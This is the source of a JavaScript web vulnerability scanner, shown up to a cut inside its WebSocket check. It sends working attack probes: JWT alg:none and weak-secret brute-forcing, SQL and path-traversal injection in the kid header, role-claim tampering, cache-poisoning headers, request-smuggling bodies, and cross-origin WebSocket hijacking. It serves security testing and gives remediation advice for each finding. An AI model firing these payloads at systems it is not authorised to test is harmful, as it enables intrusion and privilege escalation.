import { httpGet, httpPost, httpRequest } from '../../../utils/http-client.js';
import { generateId, sleep, base64Encode, base64Decode } from '../../../utils/helpers.js';
import logger from '../../../utils/logger.js';

/**
 * Advanced Web Vulnerability Scanner
 * Covers: JWT, CSRF, Cache Poisoning, HTTP Smuggling, HPP, Cookie Security,
 * Clickjacking, WebSocket, Prototype Pollution, Insecure Deserialization,
 * Race Conditions, Mass Assignment, GraphQL
 */
export class AdvancedScanner {
  constructor(options = {}) {
    this.timeout = options.timeout || 10000;
    this.concurrency = options.concurrency || 5;
    this.findings = [];
  }

  /**
   * Run all advanced vulnerability checks
   */
  async scan(url, options = {}) {
    const scanModules = [
      { name: 'JWT Vulnerabilities', fn: () => this.scanJWT(url, options) },
      { name: 'CSRF Detection', fn: () => this.scanCSRF(url, options) },
      { name: 'Cache Poisoning', fn: () => this.scanCachePoisoning(url, options) },
      { name: 'HTTP Request Smuggling', fn: () => this.scanRequestSmuggling(url, options) },
      { name: 'HTTP Parameter Pollution', fn: () => this.scanHPP(url, options) },
      { name: 'Cookie Security', fn: () => this.scanCookieSecurity(url, options) },
      { name: 'Clickjacking', fn: () => this.scanClickjacking(url, options) },
      { name: 'WebSocket Security', fn: () => this.scanWebSocket(url, options) },
      { name: 'Prototype Pollution', fn: () => this.scanPrototypePollution(url, options) },
      { name: 'Insecure Deserialization', fn: () => this.scanDeserialization(url, options) },
      { name: 'Race Conditions', fn: () => this.scanRaceConditions(url, options) },
      { name: 'Mass Assignment', fn: () => this.scanMassAssignment(url, options) },
      { name: 'GraphQL Security', fn: () => this.scanGraphQL(url, options) },
    ];

    for (const mod of scanModules) {
      try {
        logger.info(`  [${mod.name}] Scanning...`);
        const results = await mod.fn();
        if (results && results.length > 0) {
          this.findings.push(...results);
          results.forEach(r => logger.vuln?.(r.severity, `    FOUND: ${r.title}`) || logger.info(`    FOUND [${r.severity}]: ${r.title}`));
        }
      } catch (e) {
        logger.debug?.(`  [${mod.name}] Error: ${e.message}`) || logger.info(`  [${mod.name}] Error: ${e.message}`);
      }
    }

    return this.findings;
  }

  // ═══════════════════════════════════════════════════════════
  // JWT VULNERABILITIES
  // ═══════════════════════════════════════════════════════════
  async scanJWT(url, options = {}) {
    const findings = [];
    const resp = await httpGet(url, { timeout: this.timeout });
    const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data || '');
    const headers = resp.headers || {};

    // Extract JWTs from response headers and body
    const jwtRegex = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/g;
    const tokens = [];
    const bodyMatches = body.match(jwtRegex) || [];
    tokens.push(...bodyMatches);

    // Check cookies and authorization headers for JWTs
    const setCookies = headers['set-cookie'];
    if (setCookies) {
      const cookieStr = Array.isArray(setCookies) ? setCookies.join('; ') : setCookies;
      const cookieJwts = cookieStr.match(jwtRegex) || [];
      tokens.push(...cookieJwts);
    }

    for (const token of tokens) {
      const parts = token.split('.');
      if (parts.length < 3) continue;

      let header, payload;
      try {
        header = JSON.parse(base64Decode(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
        payload = JSON.parse(base64Decode(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
      } catch { continue; }

      // Test 1: None algorithm attack
      const noneHeader = base64Encode(JSON.stringify({ alg: 'none', typ: 'JWT' })).replace(/=/g, '');
      const noneToken = `${noneHeader}.${parts[1]}.`;
      const noneResp = await httpGet(url, {
        timeout: this.timeout,
        headers: { 'Authorization': `Bearer ${noneToken}`, 'Cookie': `token=${noneToken}; jwt=${noneToken}` },
      });
      if (noneResp.status === 200 && noneResp.status !== 401 && noneResp.status !== 403) {
        findings.push(this._createFinding({
          type: 'jwt-none-algorithm', title: 'JWT None Algorithm Accepted',
          severity: 'critical', url, parameter: 'Authorization / Cookie',
          payload: noneToken,
          evidence: `Server accepted JWT with alg:none. Original alg: ${header.alg}`,
          request: `GET ${url}\nAuthorization: Bearer ${noneToken.substring(0, 50)}...`,
          response: `HTTP ${noneResp.status} - Request accepted without signature verification`,
          remediation: 'Reject tokens with alg:none. Use a strict allowlist of accepted algorithms.',
          cwe: 'CWE-327', owasp: 'A02:2021 Cryptographic Failures',
        }));
      }

      // Test 2: Weak secret brute-force (common secrets)
      const weakSecrets = ['secret', 'password', '123456', 'key', 'jwt_secret', 'changeme', 'admin', 'test', 'default', 'supersecret'];
      if (header.alg && header.alg.startsWith('HS')) {
        for (const secret of weakSecrets) {
          // Attempt HMAC verification with weak secret
          const testToken = this._createHMACToken(header, payload, secret);
          const weakResp = await httpGet(url, {
            timeout: this.timeout,
            headers: { 'Authorization': `Bearer ${testToken}`, 'Cookie': `token=${testToken}; jwt=${testToken}` },
          });
          if (weakResp.status === 200 && weakResp.status !== 401) {
            findings.push(this._createFinding({
              type: 'jwt-weak-secret', title: `JWT Weak Secret Detected: "${secret}"`,
              severity: 'critical', url, parameter: 'JWT Secret',
              payload: `Secret: ${secret}`,
              evidence: `JWT signed with weak secret "${secret}" was accepted by the server`,
              request: `GET ${url}\nAuthorization: Bearer ${testToken.substring(0, 50)}...`,
              response: `HTTP ${weakResp.status} - Token accepted with guessed secret`,
              remediation: 'Use a strong, randomly generated secret (256+ bits). Consider asymmetric algorithms (RS256).',
              cwe: 'CWE-521', owasp: 'A02:2021 Cryptographic Failures',
            }));
            break;
          }
        }
      }

      // Test 3: KID injection
      if (header.kid) {
        const kidPayloads = [
          { kid: '../../../../../../dev/null', desc: 'Path traversal to /dev/null (empty key)' },
          { kid: "' UNION SELECT 'secret' -- ", desc: 'SQL injection in kid' },
          { kid: '/proc/self/environ', desc: 'Path traversal to environment' },
        ];
        for (const kp of kidPayloads) {
          const injHeader = { ...header, kid: kp.kid };
          const injToken = `${base64Encode(JSON.stringify(injHeader)).replace(/=/g, '')}.${parts[1]}.${parts[2]}`;
          const kidResp = await httpGet(url, {
            timeout: this.timeout,
            headers: { 'Authorization': `Bearer ${injToken}` },
          });
          if (kidResp.status === 200) {
            findings.push(this._createFinding({
              type: 'jwt-kid-injection', title: `JWT KID Parameter Injection: ${kp.desc}`,
              severity: 'high', url, parameter: 'JWT kid header',
              payload: kp.kid,
              evidence: `Modified kid parameter accepted: ${kp.desc}`,
              request: `GET ${url}\nAuthorization: Bearer [token with kid="${kp.kid}"]`,
              response: `HTTP ${kidResp.status} - Token with injected kid accepted`,
              remediation: 'Validate kid parameter against allowlist. Never use kid in file paths or SQL queries.',
              cwe: 'CWE-20', owasp: 'A02:2021 Cryptographic Failures',
            }));
            break;
          }
        }
      }

      // Test 4: Claim tampering (role escalation)
      const tamperClaims = [
        { key: 'role', values: ['admin', 'administrator', 'root', 'superuser'] },
        { key: 'admin', values: [true, 1, 'true'] },
        { key: 'is_admin', values: [true, 1] },
        { key: 'privilege', values: ['admin', 'elevated'] },
      ];
      for (const tc of tamperClaims) {
        if (payload[tc.key] !== undefined) {
          for (const val of tc.values) {
            if (payload[tc.key] === val) continue;
            const tamperedPayload = { ...payload, [tc.key]: val };
            const tamperedB64 = base64Encode(JSON.stringify(tamperedPayload)).replace(/=/g, '');
            const tamperedToken = `${parts[0]}.${tamperedB64}.${parts[2]}`;
            const tampResp = await httpGet(url, {
              timeout: this.timeout,
              headers: { 'Authorization': `Bearer ${tamperedToken}` },
            });
            if (tampResp.status === 200) {
              findings.push(this._createFinding({
                type: 'jwt-claim-tampering', title: `JWT Claim Tampering: ${tc.key}=${val}`,
                severity: 'high', url, parameter: `JWT claim: ${tc.key}`,
                payload: `${tc.key}: ${JSON.stringify(val)}`,
                evidence: `Tampered claim ${tc.key}=${JSON.stringify(val)} accepted (original: ${JSON.stringify(payload[tc.key])})`,
                request: `GET ${url}\nAuthorization: Bearer [tampered token]`,
                response: `HTTP ${tampResp.status} - Elevated privileges may be granted`,
                remediation: 'Always verify JWT signature before trusting claims. Implement server-side authorization.',
                cwe: 'CWE-285', owasp: 'A01:2021 Broken Access Control',
              }));
              break;
            }
          }
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // CSRF DETECTION
  // ═══════════════════════════════════════════════════════════
  async scanCSRF(url, options = {}) {
    const findings = [];
    const resp = await httpGet(url, { timeout: this.timeout });
    const body = typeof resp.data === 'string' ? resp.data : '';
    const headers = resp.headers || {};

    // Check for forms without CSRF tokens
    const formRegex = /<form[^>]*method=["']?post["']?[^>]*>([\s\S]*?)<\/form>/gi;
    let formMatch;
    let formIndex = 0;

    while ((formMatch = formRegex.exec(body)) !== null) {
      formIndex++;
      const formContent = formMatch[1];
      const formAction = formMatch[0].match(/action=["']([^"']+)["']/)?.[1] || url;

      // Check for CSRF token fields
      const csrfFieldNames = ['csrf', 'token', '_token', 'csrfmiddlewaretoken', 'authenticity_token', '__RequestVerificationToken', 'antiforgery', 'nonce'];
      const hasCSRFToken = csrfFieldNames.some(name =>
        formContent.toLowerCase().includes(name.toLowerCase())
      );

      if (!hasCSRFToken) {
        findings.push(this._createFinding({
          type: 'csrf-missing-token', title: `CSRF: Missing Token in POST Form #${formIndex}`,
          severity: 'high', url, parameter: `Form action: ${formAction}`,
          payload: 'No CSRF token field found in form',
          evidence: `POST form at ${formAction} has no anti-CSRF token`,
          request: `GET ${url} - Analyzed form #${formIndex}`,
          response: `Form lacks csrf/token/_token/authenticity_token hidden field`,
          remediation: 'Add a unique, unpredictable CSRF token to all state-changing forms. Use SameSite cookies.',
          cwe: 'CWE-352', owasp: 'A01:2021 Broken Access Control',
        }));
      }

      // Check for weak/predictable tokens
      const tokenMatch = formContent.match(/value=["']([a-f0-9]{8,})["']/i);
      if (tokenMatch) {
        const tokenValue = tokenMatch[1];
        // Check if token is too short (< 16 chars)
        if (tokenValue.length < 16) {
          findings.push(this._createFinding({
            type: 'csrf-weak-token', title: `CSRF: Weak Token (${tokenValue.length} chars) in Form #${formIndex}`,
            severity: 'medium', url, parameter: 'CSRF Token',
            payload: `Token length: ${tokenValue.length}`,
            evidence: `CSRF token is only ${tokenValue.length} characters, potentially brute-forceable`,
            request: `GET ${url} - Form #${formIndex}`,
            response: `Token: ${tokenValue.substring(0, 10)}...`,
            remediation: 'Use tokens of at least 128 bits (32 hex characters) generated with a CSPRNG.',
            cwe: 'CWE-352', owasp: 'A01:2021 Broken Access Control',
          }));
        }
      }
    }

    // Check SameSite cookie attribute
    const setCookies = headers['set-cookie'];
    if (setCookies) {
      const cookies = Array.isArray(setCookies) ? setCookies : [setCookies];
      for (const cookie of cookies) {
        const cookieName = cookie.split('=')[0].trim();
        const isSession = /sess|auth|token|login|user/i.test(cookieName);
        if (isSession && !cookie.toLowerCase().includes('samesite')) {
          findings.push(this._createFinding({
            type: 'csrf-samesite-missing', title: `CSRF: Session Cookie "${cookieName}" Missing SameSite Attribute`,
            severity: 'medium', url, parameter: `Cookie: ${cookieName}`,
            payload: 'SameSite attribute not set',
            evidence: `Session cookie "${cookieName}" lacks SameSite attribute, vulnerable to CSRF`,
            request: `GET ${url}`,
            response: `Set-Cookie: ${cookie.substring(0, 80)}...`,
            remediation: 'Set SameSite=Strict or SameSite=Lax on all session cookies.',
            cwe: 'CWE-1275', owasp: 'A01:2021 Broken Access Control',
          }));
        }
        if (isSession && cookie.toLowerCase().includes('samesite=none')) {
          findings.push(this._createFinding({
            type: 'csrf-samesite-none', title: `CSRF: Session Cookie "${cookieName}" Has SameSite=None`,
            severity: 'medium', url, parameter: `Cookie: ${cookieName}`,
            payload: 'SameSite=None',
            evidence: `Session cookie "${cookieName}" uses SameSite=None, cross-site requests will include it`,
            request: `GET ${url}`,
            response: `Set-Cookie: ${cookie.substring(0, 80)}...`,
            remediation: 'Use SameSite=Strict or SameSite=Lax unless cross-site cookie sending is explicitly required.',
            cwe: 'CWE-1275', owasp: 'A01:2021 Broken Access Control',
          }));
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // CACHE POISONING
  // ═══════════════════════════════════════════════════════════
  async scanCachePoisoning(url, options = {}) {
    const findings = [];
    const cacheBuster = `cb=${Date.now()}`;
    const testUrl = url.includes('?') ? `${url}&${cacheBuster}` : `${url}?${cacheBuster}`;

    // Unkeyed headers that might be reflected
    const unkeyedHeaders = [
      { name: 'X-Forwarded-Host', value: 'evil-cache-poison.com', desc: 'X-Forwarded-Host' },
      { name: 'X-Host', value: 'evil-cache-poison.com', desc: 'X-Host' },
      { name: 'X-Forwarded-Scheme', value: 'nothttps', desc: 'X-Forwarded-Scheme' },
      { name: 'X-Original-URL', value: '/admin', desc: 'X-Original-URL' },
      { name: 'X-Rewrite-URL', value: '/admin', desc: 'X-Rewrite-URL' },
      { name: 'X-Forwarded-Port', value: '4443', desc: 'X-Forwarded-Port' },
      { name: 'X-Forwarded-Prefix', value: '/evil', desc: 'X-Forwarded-Prefix' },
      { name: 'Transfer-Encoding', value: 'chunked', desc: 'Transfer-Encoding variation' },
    ];

    for (const header of unkeyedHeaders) {
      const poisonResp = await httpGet(testUrl, {
        timeout: this.timeout,
        headers: { [header.name]: header.value },
      });
      const poisonBody = typeof poisonResp.data === 'string' ? poisonResp.data : '';

      if (poisonBody.includes(header.value)) {
        // Verify it's cached by making a normal request
        await sleep(500);
        const verifyResp = await httpGet(testUrl, { timeout: this.timeout });
        const verifyBody = typeof verifyResp.data === 'string' ? verifyResp.data : '';

        const isCached = verifyBody.includes(header.value);
        findings.push(this._createFinding({
          type: 'cache-poisoning', title: `Cache Poisoning via ${header.desc}${isCached ? ' (CONFIRMED CACHED)' : ' (Reflected)'}`,
          severity: isCached ? 'critical' : 'high', url, parameter: header.name,
          payload: `${header.name}: ${header.value}`,
          evidence: `Header value "${header.value}" reflected in response${isCached ? ' and persisted in cache' : ''}`,
          request: `GET ${testUrl}\n${header.name}: ${header.value}`,
          response: `HTTP ${poisonResp.status} - Injected value in response body`,
          remediation: 'Include all reflected headers in cache key. Use Vary header. Disable caching for dynamic content.',
          cwe: 'CWE-444', owasp: 'A05:2021 Security Misconfiguration',
        }));
      }
    }

    // Cache key confusion via path normalization
    const confusionPaths = [
      { path: '/..%2f', desc: 'Path normalization bypass' },
      { path: '/%2e%2e/', desc: 'Encoded dot-dot' },
      { path: '/;/admin', desc: 'Semicolon path parameter' },
    ];

    const baseUrl = url.replace(/\/$/, '');
    for (const cp of confusionPaths) {
      const confResp = await httpGet(`${baseUrl}${cp.path}`, { timeout: this.timeout });
      if (confResp.status === 200) {
        const cacheHeaders = confResp.headers['x-cache'] || confResp.headers['cf-cache-status'] || '';
        if (cacheHeaders.toLowerCase().includes('hit') || cacheHeaders.toLowerCase().includes('miss')) {
          findings.push(this._createFinding({
            type: 'cache-key-confusion', title: `Cache Key Confusion: ${cp.desc}`,
            severity: 'medium', url: `${baseUrl}${cp.path}`, parameter: 'URL Path',
            payload: cp.path,
            evidence: `Path "${cp.path}" served cached content (${cacheHeaders})`,
            request: `GET ${baseUrl}${cp.path}`,
            response: `HTTP ${confResp.status} - Cache header: ${cacheHeaders}`,
            remediation: 'Normalize paths before cache key generation. Strip path parameters from cache keys.',
            cwe: 'CWE-444', owasp: 'A05:2021 Security Misconfiguration',
          }));
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // HTTP REQUEST SMUGGLING
  // ═══════════════════════════════════════════════════════════
  async scanRequestSmuggling(url, options = {}) {
    const findings = [];

    // CL.TE detection: Front-end uses Content-Length, back-end uses Transfer-Encoding
    try {
      const cltePayload = '0\r\n\r\nGET /smuggle-clte HTTP/1.1\r\nHost: smuggle-detect\r\n\r\n';
      const clteResp = await httpRequest('POST', url, {
        timeout: this.timeout + 5000,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': String(cltePayload.length),
          'Transfer-Encoding': 'chunked',
        },
        body: cltePayload,
      });

      // If we get a response indicating the smuggled request was processed
      if (clteResp.status === 400 || clteResp.status === 403) {
        // Send a timing-based probe
        const probe1Start = Date.now();
        await httpRequest('POST', url, {
          timeout: 5000,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '4',
            'Transfer-Encoding': 'chunked',
          },
          body: '1\r\nZ\r\nQ',
        });
        const probe1Time = Date.now() - probe1Start;

        if (probe1Time >= 4500) {
          findings.push(this._createFinding({
            type: 'http-smuggling-clte', title: 'HTTP Request Smuggling (CL.TE)',
            severity: 'critical', url, parameter: 'Content-Length / Transfer-Encoding',
            payload: 'CL.TE desync: Content-Length processed by front-end, Transfer-Encoding by back-end',
            evidence: `Timing anomaly detected (${probe1Time}ms delay) indicating CL.TE desync`,
            request: `POST ${url}\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\\r\\nZ\\r\\nQ`,
            response: `Response delayed ${probe1Time}ms - back-end waiting for chunk terminator`,
            remediation: 'Normalize Transfer-Encoding handling. Use HTTP/2 end-to-end. Reject ambiguous requests.',
            cwe: 'CWE-444', owasp: 'A05:2021 Security Misconfiguration',
          }));
        }
      }
    } catch { /* timeout may indicate vulnerability */ }

    // TE.CL detection: Front-end uses Transfer-Encoding, back-end uses Content-Length
    try {
      const teclPayload = '0\r\n\r\n';
      const probe2Start = Date.now();
      await httpRequest('POST', url, {
        timeout: 5000,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': '100',
          'Transfer-Encoding': 'chunked',
        },
        body: teclPayload,
      });
      const probe2Time = Date.now() - probe2Start;

      if (probe2Time >= 4500) {
        findings.push(this._createFinding({
          type: 'http-smuggling-tecl', title: 'HTTP Request Smuggling (TE.CL)',
          severity: 'critical', url, parameter: 'Transfer-Encoding / Content-Length',
          payload: 'TE.CL desync: Transfer-Encoding processed by front-end, Content-Length by back-end',
          evidence: `Timing anomaly detected (${probe2Time}ms delay) indicating TE.CL desync`,
          request: `POST ${url}\nContent-Length: 100\nTransfer-Encoding: chunked\n\n0\\r\\n\\r\\n`,
          response: `Response delayed ${probe2Time}ms - back-end waiting for more Content-Length data`,
          remediation: 'Normalize request parsing. Use HTTP/2. Reject requests with both CL and TE headers.',
          cwe: 'CWE-444', owasp: 'A05:2021 Security Misconfiguration',
        }));
      }
    } catch { /* skip */ }

    // TE.TE detection: Obfuscated Transfer-Encoding
    const teObfuscations = [
      'Transfer-Encoding: xchunked',
      'Transfer-Encoding : chunked',
      'Transfer-Encoding: chunked\r\nTransfer-Encoding: x',
      'Transfer-Encoding: x\r\nTransfer-Encoding: chunked',
    ];

    for (const teHeader of teObfuscations) {
      try {
        const resp = await httpRequest('POST', url, {
          timeout: this.timeout,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Transfer-Encoding': teHeader.split(': ')[1] || 'chunked',
          },
          body: '0\r\n\r\n',
        });
        if (resp.status >= 400 && resp.status !== 405) {
          // Different handling of obfuscated TE may indicate vulnerability
          findings.push(this._createFinding({
            type: 'http-smuggling-tete', title: `HTTP Smuggling: TE Obfuscation Accepted (${teHeader.substring(0, 30)})`,
            severity: 'medium', url, parameter: 'Transfer-Encoding',
            payload: teHeader,
            evidence: `Server responded with ${resp.status} to obfuscated Transfer-Encoding`,
            request: `POST ${url}\n${teHeader}\n\n0\\r\\n\\r\\n`,
            response: `HTTP ${resp.status} - Obfuscated TE header processed differently`,
            remediation: 'Strictly validate Transfer-Encoding header. Reject malformed values.',
            cwe: 'CWE-444', owasp: 'A05:2021 Security Misconfiguration',
          }));
          break;
        }
      } catch { /* skip */ }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // HTTP PARAMETER POLLUTION
  // ═══════════════════════════════════════════════════════════
  async scanHPP(url, options = {}) {
    const findings = [];
    const parsedUrl = new URL(url);
    const params = Object.fromEntries(parsedUrl.searchParams.entries());

    if (Object.keys(params).length === 0) return findings;

    for (const [param, originalValue] of Object.entries(params)) {
      // Duplicate parameter with different value
      const pollutedUrl = `${url}&${encodeURIComponent(param)}=hpp_injected`;
      const resp = await httpGet(pollutedUrl, { timeout: this.timeout });
      const body = typeof resp.data === 'string' ? resp.data : '';

      if (body.includes('hpp_injected')) {
        // Check if both values are present (server uses last/first/both)
        const hasOriginal = body.includes(originalValue);
        const behavior = hasOriginal ? 'both values used' : 'injected value overrides original';

        findings.push(this._createFinding({
          type: 'hpp', title: `HTTP Parameter Pollution in "${param}"`,
          severity: 'medium', url, parameter: param,
          payload: `${param}=${originalValue}&${param}=hpp_injected`,
          evidence: `Duplicate parameter accepted. Behavior: ${behavior}`,
          request: `GET ${pollutedUrl}`,
          response: `HTTP ${resp.status} - Injected value reflected (${behavior})`,
          remediation: 'Use only the first or last occurrence of duplicate parameters. Validate parameter uniqueness.',
          cwe: 'CWE-235', owasp: 'A03:2021 Injection',
        }));
      }

      // Array notation pollution
      const arrayUrl = `${url.split('?')[0]}?${param}[]=${originalValue}&${param}[]=hpp_array`;
      const arrayResp = await httpGet(arrayUrl, { timeout: this.timeout });
      const arrayBody = typeof arrayResp.data === 'string' ? arrayResp.data : '';

      if (arrayResp.status === 200 && arrayBody.includes('hpp_array')) {
        findings.push(this._createFinding({
          type: 'hpp-array', title: `HPP Array Injection in "${param}"`,
          severity: 'medium', url, parameter: `${param}[]`,
          payload: `${param}[]=${originalValue}&${param}[]=hpp_array`,
          evidence: 'Array notation parameter accepted and processed',
          request: `GET ${arrayUrl}`,
          response: `HTTP ${arrayResp.status} - Array values processed`,
          remediation: 'Validate parameter types. Reject unexpected array parameters.',
          cwe: 'CWE-235', owasp: 'A03:2021 Injection',
        }));
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // COOKIE SECURITY
  // ═══════════════════════════════════════════════════════════
  async scanCookieSecurity(url, options = {}) {
    const findings = [];
    const resp = await httpGet(url, { timeout: this.timeout });
    const headers = resp.headers || {};
    const setCookies = headers['set-cookie'];

    if (!setCookies) return findings;

    const cookies = Array.isArray(setCookies) ? setCookies : [setCookies];

    for (const cookie of cookies) {
      const cookieName = cookie.split('=')[0].trim();
      const cookieLower = cookie.toLowerCase();
      const isSession = /sess|auth|token|login|user|jwt|sid|id/i.test(cookieName);

      // Missing Secure flag
      if (!cookieLower.includes('secure') && url.startsWith('https')) {
        findings.push(this._createFinding({
          type: 'cookie-no-secure', title: `Cookie "${cookieName}" Missing Secure Flag`,
          severity: isSession ? 'high' : 'low', url, parameter: `Cookie: ${cookieName}`,
          payload: 'Secure flag not set',
          evidence: `Cookie "${cookieName}" can be transmitted over unencrypted HTTP connections`,
          request: `GET ${url}`,
          response: `Set-Cookie: ${cookie.substring(0, 100)}`,
          remediation: 'Add the Secure flag to all cookies, especially session cookies.',
          cwe: 'CWE-614', owasp: 'A05:2021 Security Misconfiguration',
        }));
      }

      // Missing HttpOnly flag
      if (!cookieLower.includes('httponly') && isSession) {
        findings.push(this._createFinding({
          type: 'cookie-no-httponly', title: `Session Cookie "${cookieName}" Missing HttpOnly Flag`,
          severity: 'high', url, parameter: `Cookie: ${cookieName}`,
          payload: 'HttpOnly flag not set',
          evidence: `Session cookie "${cookieName}" accessible via JavaScript (document.cookie)`,
          request: `GET ${url}`,
          response: `Set-Cookie: ${cookie.substring(0, 100)}`,
          remediation: 'Add the HttpOnly flag to all session cookies to prevent XSS-based theft.',
          cwe: 'CWE-1004', owasp: 'A05:2021 Security Misconfiguration',
        }));
      }

      // Missing SameSite flag
      if (!cookieLower.includes('samesite') && isSession) {
        findings.push(this._createFinding({
          type: 'cookie-no-samesite', title: `Session Cookie "${cookieName}" Missing SameSite Attribute`,
          severity: 'medium', url, parameter: `Cookie: ${cookieName}`,
          payload: 'SameSite attribute not set',
          evidence: `Cookie "${cookieName}" will be sent with cross-site requests (CSRF risk)`,
          request: `GET ${url}`,
          response: `Set-Cookie: ${cookie.substring(0, 100)}`,
          remediation: 'Set SameSite=Strict or SameSite=Lax on session cookies.',
          cwe: 'CWE-1275', owasp: 'A05:2021 Security Misconfiguration',
        }));
      }

      // Overly broad domain
      const domainMatch = cookie.match(/domain=([^;]+)/i);
      if (domainMatch) {
        const domain = domainMatch[1].trim();
        if (domain.startsWith('.') && domain.split('.').length <= 3) {
          findings.push(this._createFinding({
            type: 'cookie-broad-domain', title: `Cookie "${cookieName}" Has Overly Broad Domain: ${domain}`,
            severity: 'low', url, parameter: `Cookie: ${cookieName}`,
            payload: `Domain=${domain}`,
            evidence: `Cookie shared across all subdomains of ${domain}`,
            request: `GET ${url}`,
            response: `Set-Cookie: ${cookie.substring(0, 100)}`,
            remediation: 'Restrict cookie domain to the specific subdomain that needs it.',
            cwe: 'CWE-732', owasp: 'A05:2021 Security Misconfiguration',
          }));
        }
      }
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // CLICKJACKING
  // ═══════════════════════════════════════════════════════════
  async scanClickjacking(url, options = {}) {
    const findings = [];
    const resp = await httpGet(url, { timeout: this.timeout });
    const headers = resp.headers || {};

    const xfo = headers['x-frame-options'];
    const csp = headers['content-security-policy'] || '';
    const frameAncestors = csp.match(/frame-ancestors\s+([^;]+)/i);

    // No frame protection at all
    if (!xfo && !frameAncestors) {
      findings.push(this._createFinding({
        type: 'clickjacking-no-protection', title: 'Clickjacking: No Frame Protection Headers',
        severity: 'medium', url, parameter: 'X-Frame-Options / CSP frame-ancestors',
        payload: '<iframe src="' + url + '"></iframe>',
        evidence: 'Neither X-Frame-Options nor CSP frame-ancestors is set. Page can be framed by any origin.',
        request: `GET ${url}`,
        response: `HTTP ${resp.status} - No X-Frame-Options, No CSP frame-ancestors`,
        remediation: 'Add "X-Frame-Options: DENY" and "Content-Security-Policy: frame-ancestors \'none\'" headers.',
        cwe: 'CWE-1021', owasp: 'A05:2021 Security Misconfiguration',
      }));
    }

    // Weak X-Frame-Options (ALLOWALL or invalid)
    if (xfo && !['deny', 'sameorigin'].includes(xfo.toLowerCase().trim())) {
      findings.push(this._createFinding({
        type: 'clickjacking-weak-xfo', title: `Clickjacking: Weak X-Frame-Options Value: ${xfo}`,
        severity: 'medium', url, parameter: 'X-Frame-Options',
        payload: xfo,
        evidence: `X-Frame-Options has non-standard value "${xfo}" which may not be enforced`,
        request: `GET ${url}`,
        response: `X-Frame-Options: ${xfo}`,
        remediation: 'Use X-Frame-Options: DENY or SAMEORIGIN. Prefer CSP frame-ancestors.',
        cwe: 'CWE-1021', owasp: 'A05:2021 Security Misconfiguration',
      }));
    }

    // CSP frame-ancestors with wildcard
    if (frameAncestors && frameAncestors[1].includes('*')) {
      findings.push(this._createFinding({
        type: 'clickjacking-wildcard-ancestors', title: 'Clickjacking: CSP frame-ancestors Contains Wildcard',
        severity: 'medium', url, parameter: 'CSP frame-ancestors',
        payload: `frame-ancestors ${frameAncestors[1]}`,
        evidence: 'Wildcard in frame-ancestors allows framing from any origin',
        request: `GET ${url}`,
        response: `Content-Security-Policy: frame-ancestors ${frameAncestors[1]}`,
        remediation: 'Replace wildcard with specific trusted origins in frame-ancestors directive.',
        cwe: 'CWE-1021', owasp: 'A05:2021 Security Misconfiguration',
      }));
    }

    return findings;
  }

  // ═══════════════════════════════════════════════════════════
  // WEBSOCKET SECURITY
  // ═══════════════════════════════════════════════════════════
  async scanWebSocket(url, options = {}) {
    const findings = [];
    const resp = await httpGet(url, { timeout: this.timeout });
    const body = typeof resp.data === 'string' ? resp.data : '';

    // Detect WebSocket endpoints in page source
    const wsRegex = /wss?:\/\/[^\s"'<>]+/g;
    const wsEndpoints = body.match(wsRegex) || [];

    // Also check common WebSocket paths
    const baseUrl = new URL(url);
    const commonWsPaths = ['/ws', '/websocket', '/socket.io/', '/sockjs', '/cable', '/hub', '/realtime'];

    for (const wsPath of commonWsPaths) {
      const wsUrl = `${baseUrl.protocol}//${baseUrl.host}${wsPath}`;
      // Try HTTP upgrade request
      const upgradeResp = await httpGet(wsUrl, {
        timeout: this.timeout,
        headers: {
          'Upgrade': 'websocket',
          'Connection': 'Upgrade',
          'Sec-WebSocket-Key': base64Encode('test-key-12345678'),
          'Sec-WebSocket-Version': '13',
          'Origin': 'https://evil.com',
        },
      });

      if (upgradeResp.status === 101 || upgradeResp.status === 200) {
        wsEndpoints.push(wsUrl);
      }
    }

    for (const wsEndpoint of [...new Set(wsEndpoints)]) {
      // Test CSWSH (Cross-Site WebSocket Hijacking) - Origin not validated
      const cswshResp = await httpGet(wsEndpoint.replace('ws://', 'http://').replace('wss://', 'https://'), {
        timeout: this.timeout,
        headers: {
          'Upgrade': 'websocket',
          'Connection': 'Upgrade',
          'Sec-WebSocket-Key': base64Encode('cswsh-test-key123'),
          'Sec-WebSocket-Version': '13',
          'Origin': 'https://evil-attacker.com',
        },
      });

      if (cswshResp.status === 101) {
        findings.push(this._createFinding({
          type: 'websocket-cswsh', title: `Cross-Site WebSocket Hijacking: ${wsEndpoint}`,
          severity: 'high', url: wsEndpoint, parameter: 'Origin header',
          payload: 'Origin: https://evil-attacker.com',
          evidence: 'WebSocket upgrade accepted with arbitrary Origin header',
          request: `GET ${wsEndpoint}\nUpgrade: websocket\nOrigin: https://evil-attacker.com`,
          response: `HTTP 101 Switching Protocols - Connection accepted from evil origin`,
          remediation: 'Validate Origin header on WebSocket handshake. Implement authentication tokens.',
          cwe: 'CWE-346', owasp: 'A01:2021 Broken Access Control',
        }));
      }

      // Check for unencrypted WebSocket (ws:// instead of wss://)
      if (wsEndpoint.startsWith('ws://')) {
        findings.push(this._createFinding({
          type: 'websocket-unencrypted', title: `Unencrypted WebSocket Connection: ${wsEndpoint}`,
          severity: 'medium', url: wsEndpoint, parameter: 'WebSocket Protocol',
          payload: wsEndpoint,
          evidence: 'WebSocket uses ws:// (unencrypted) instead of wss:// (TLS)',
          request: `Connection to ${wsEndpoint}`,
          response: 'Unencrypted WebSocket traffic susceptible to interception',
          remediation: 'Use wss:// (WebSocket Secure) for all WebSocket connections.',
